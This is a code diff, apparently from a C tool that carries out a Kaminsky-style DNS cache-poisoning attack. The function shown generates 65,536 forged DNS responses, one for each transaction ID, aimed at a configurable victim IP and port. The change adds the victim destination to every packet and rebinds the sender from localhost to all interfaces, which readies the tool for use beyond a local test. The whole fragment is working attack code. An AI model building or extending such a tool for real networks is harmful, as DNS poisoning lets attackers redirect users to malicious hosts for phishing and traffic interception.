@@ -210,13 +210,19 @@ bool make_kaminsky_packets(packet_queue_t* queue, void* args) {
         return false;
     }
 
+    struct sockaddr_in dest_addr_template;
+    memset(&dest_addr_template, 0, sizeof(dest_addr_template));
+    dest_addr_template.sin_family = AF_INET;
+    dest_addr_template.sin_addr.s_addr = inet_addr(s_args->victim_ip);
+    dest_addr_template.sin_port = htons(s_args->victim_port);
+
     // 2. Generate 65536 packets, each with a different TXID
     for (uint32_t i = 0; i <= UINT16_MAX; i++) {
         packet_t* new_pkt = (packet_t*)alloc_memory(sizeof(packet_t));
         new_pkt->data = (uint8_t*)alloc_memory(packet_raw_len);
         new_pkt->size = packet_raw_len;
         new_pkt->next = NULL;
-
+        memcpy(&new_pkt->dest_addr, &dest_addr_template, sizeof(dest_addr_template));
         memcpy(new_pkt->data, packet_template, packet_raw_len);
         struct dnshdr* dnsh = (struct dnshdr*)(new_pkt->data + sizeof(struct iphdr) + sizeof(struct udphdr));
         dnsh->id = htons((uint16_t)i);
@@ -345,7 +351,7 @@ int main(int argc, char** argv) {
 
     // 初始化 sender 框架
     sender_t my_sender;
-    if (sender_init(&my_sender, loop, "127.0.0.1", 0) != 0) {
+    if (sender_init(&my_sender, loop, "0.0.0.0", 0) != 0) {
         fprintf(stderr, "Failed to initialize sender\n");
         return 1;
     }
